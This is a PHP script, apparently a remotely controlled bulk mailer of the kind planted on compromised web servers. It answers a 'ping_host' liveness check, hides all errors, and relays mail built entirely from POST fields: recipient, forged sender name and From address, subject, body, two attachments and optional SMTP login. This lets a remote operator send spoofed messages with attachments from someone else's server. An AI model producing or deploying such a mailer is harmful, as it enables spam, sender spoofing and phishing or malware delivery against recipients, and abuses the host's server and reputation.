<?php
error_reporting(0);
if (isset($_GET["ping"]) and $_GET["ping"] == ("ping_host")) { 
echo "true"; 
}else{ 

function smtpmail($host, $port, $smtp_login, $smtp_passw, $mail_to, $message, $SEND) {
	
	$SEND .=  $message."\r\n";
		
	 if(!$socket = @fsockopen($host, $port, $errno, $errstr, 10) ) { return false; }
 
         if (!server_parse($socket, "220", __LINE__)) return false;
 
            fputs($socket, "HELO " . $smtp_login . "\r\n");
            if (!server_parse($socket, "250", __LINE__)) {
               fclose($socket);
               return false;
            }
			
            fputs($socket, "AUTH LOGIN\r\n");
            if (!server_parse($socket, "334", __LINE__)) {
               fclose($socket);
               return false;
            }
 
            fputs($socket, base64_encode($smtp_login) . "\r\n");
            if (!server_parse($socket, "334", __LINE__)) {
               fclose($socket);
               return false;
            }
            fputs($socket, base64_encode($smtp_passw) . "\r\n");
            if (!server_parse($socket, "235", __LINE__)) {
               fclose($socket);          
                 return false;
            }
            fputs($socket, "MAIL FROM: <".$smtp_login.">\r\n");
            if (!server_parse($socket, "250", __LINE__)) {
               fclose($socket);
               return false;
            }
            fputs($socket, "RCPT TO: <" .$mail_to. ">\r\n");
 
            if (!server_parse($socket, "250", __LINE__)) {
               fclose($socket);
               return false;
            }
            fputs($socket, "DATA\r\n");
 
            if (!server_parse($socket, "354", __LINE__)) {
               fclose($socket);
               return false;
            }
            fputs($socket, $SEND."\r\n.\r\n");
 
            if (!server_parse($socket, "250", __LINE__)) {
               fclose($socket);
               return false;
            }
            fputs($socket, "QUIT\r\n");
            fclose($socket);
            return true;
}

function server_parse($socket, $response, $line = __LINE__) {
    while (@substr($server_response, 3, 1) != ' ') {
        if (!($server_response = fgets($socket, 256))) { return false; }
    }

    if (!(substr($server_response, 0, 3) == $response)) { return false; }
    return true;
}

if (isset($_POST["email_polucha"])) { $email_polucha = $_POST["email_polucha"]; }else{ exit("false"); }
if (isset($_POST["tip_pisma"]))     { $tip_pisma     = $_POST["tip_pisma"];     }else{ exit("false"); }
if (isset($_POST["name_otprav"]))   { $name_otprav   = $_POST["name_otprav"];   }else{ exit("false"); }
if (isset($_POST["adres_otp"]))     { $adres_otp     = $_POST["adres_otp"];     }else{ exit("false"); }
if (isset($_POST["tema_pisma"]))    { $tema_pisma    = $_POST["tema_pisma"];    }else{ exit("false"); }
if (isset($_POST["telo_pisma"]))    { $telo_pisma    = $_POST["telo_pisma"];    }else{ exit("false"); }
if (isset($_POST["reply_to"]))      { $reply_to      = $_POST["reply_to"];      }


if (isset($_POST["sposob_otp"]))    {
 $sposob_otp = (string)$_POST["sposob_otp"];
  if ($sposob_otp == ("true")) {
   if (isset($_POST["smtp_login"])) { $smtp_login    = $_POST["smtp_login"]; }else{ exit("false"); }
   if (isset($_POST["smtp_passw"])) { $smtp_passw    = $_POST["smtp_passw"]; }else{ exit("false"); }
   if (isset($_POST["smtp_host"]))  { $smtp_host     = $_POST["smtp_host"];  }else{ exit("false"); }
   if (isset($_POST["smtp_port"]))  { $smtp_port     = $_POST["smtp_port"];  }else{ exit("false"); }
  }
}else{ exit("false"); }


if (!empty($_FILES["fail"]["tmp_name"])) { 
 $put_k_failu  = $_FILES["fail"]["tmp_name"];
 $name_fail    = $_FILES["fail"]["name"];
 $random_name_fail = substr(preg_replace("/[^0-9a-z]/","",strtolower(crypt(""))),1,8);  
 $name_fail = $random_name_fail.$name_fail;
}
  
  
if (!empty($_FILES["fail2"]["tmp_name"])) { 
 $put_k_failu2 = $_FILES["fail2"]["tmp_name"]; 
 $name_fail2   = $_FILES["fail2"]["name"];
 $random_name_fail2 = substr(preg_replace("/[^0-9a-z]/","",strtolower(crypt(""))),1,8);  
 $name_fail2 = $random_name_fail2.$name_fail2;
}
$end_zag = "\n";
      $headers  = "From: =?UTF-8?B?".base64_encode($name_otprav)."?= <".$adres_otp.">".$end_zag;
	  
 if ($sposob_otp == ("true")) {
	  $headers .= "To: $email_polucha <$email_polucha>".$end_zag;
 }
 
 if ($reply_to != ("false")) { 
      $headers .= "Reply-To: $reply_to".$end_zag; 
}
	   
if ($sposob_otp == ("true")) {                                                                    
      $headers .= "Subject: =?UTF-8?B?".base64_encode($tema_pisma)."?=".$end_zag;   
}    

      $headers .= "MIME-Version: 1.0".$end_zag;
      $headers .= "X-Priority: 3".$end_zag;
      $headers .= "X-Mailer: PHP Mail ver.".substr(preg_replace("/[^0-9]/","",strtolower(crypt(""))),1,3).$end_zag;	  

 if (isset($put_k_failu) or isset($put_k_failu2)) {
      $un        = strtoupper(uniqid(time()));
      $headers .= "Content-Type: multipart/mixed; boundary=\"----------".$un."\"".$end_zag.$end_zag; 
 }                	  

if ($tip_pisma == ("2")) {
 if (!isset($put_k_failu) or !isset($put_k_failu2)) {
  	  $headers .= "Content-Type: text/html; charset=\"UTF-8\"".$end_zag; 	
	  $headers .= "Content-Transfer-Encoding: 8bit".$end_zag.$end_zag;
 }
  $zag_type = "text/html";     
}else{
 if (!isset($put_k_failu) or !isset($put_k_failu2)) {
	  $headers .= "Content-Type: text/plain; charset=\"UTF-8\"".$end_zag; 	
	  $headers .= "Content-Transfer-Encoding: 8bit".$end_zag.$end_zag;
 }
  $zag_type = "text/plain";
}
	  
 if (isset($put_k_failu) or isset($put_k_failu2)) { 
 
 $f           = @fopen($put_k_failu,"rb");
 $f2          = @fopen($put_k_failu2,"rb");

               $telo_pisma_fail   = "------------".$un."\nContent-Type: ".$zag_type."; Charset=UTF-8".$end_zag;
               $telo_pisma_fail  .= "Content-Transfer-Encoding: 8bit".$end_zag.$end_zag."$telo_pisma".$end_zag;	
 
  if (isset($put_k_failu)) { 
               $telo_pisma_fail  .= "------------".$un.$end_zag;
               $telo_pisma_fail  .= "Content-Type: application/octet-stream; name=\"".basename($name_fail)."\"".$end_zag;
               $telo_pisma_fail  .= "Content-Transfer-Encoding: base64".$end_zag;
	           $telo_pisma_fail  .= "Content-Disposition: attachment; filename=\"".basename($name_fail)."\"".$end_zag.$end_zag;
	           $telo_pisma_fail  .= chunk_split(base64_encode(fread($f,filesize($put_k_failu))));
  }
  
  if (isset($put_k_failu2)) {
               $telo_pisma_fail  .= $end_zag."------------".$un.$end_zag;
               $telo_pisma_fail  .= "Content-Type: application/octet-stream; name=\"".basename($name_fail2)."\"".$end_zag;
               $telo_pisma_fail  .= "Content-Transfer-Encoding: base64\n";
               $telo_pisma_fail  .= "Content-Disposition: attachment; filename=\"".basename($name_fail2)."\"".$end_zag.$end_zag;
               $telo_pisma_fail  .= chunk_split(base64_encode(fread($f2,filesize($put_k_failu2))));
  }	
               $telo_pisma_fail  .= "------------".$un."--";
               $telo_pisma = $telo_pisma_fail;

 }

if ($sposob_otp == ("true")) {
$return = smtpmail($smtp_host, $smtp_port, $smtp_login, $smtp_passw, $email_polucha, $telo_pisma, $headers);
}else{
$return = mail($email_polucha,$tema_pisma,$telo_pisma,$headers);
}

if ($return == true) {echo "true";}else{echo "false";}

}
?>